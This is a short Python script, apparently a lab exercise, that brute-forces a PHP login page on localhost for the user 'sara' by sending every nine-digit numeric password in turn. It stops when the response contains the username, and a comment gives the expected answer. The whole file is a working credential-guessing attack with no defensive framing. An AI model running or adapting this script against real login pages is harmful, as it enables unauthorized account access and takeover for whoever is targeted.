import requests
import time

start = time.perf_counter()

found = False


def check_response(response):
    if 'sara' in response:
        return True


def run_request(password):

    headers = {
        'Host': 'localhost',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Chromium";v="106"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'http://localhost/php/',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }

    params = {
        'username': 'sara',
        'password': f'{password}',
        'login': 'login',
    }

    response = requests.get(
        'http://localhost/php/login.php', params=params, headers=headers)

    if check_response(response.text) == True:
        global found
        found = True
        print(f'\n######## passsword: {password} ########')


# 333666555
for i in range(1000000000):
    print('tring {0:09}'.format(i))
    run_request('{0:09}'.format(i))

    if found == True:
        break

end = time.perf_counter()


print(f'\nfinished in {round(end - start,3)}s')
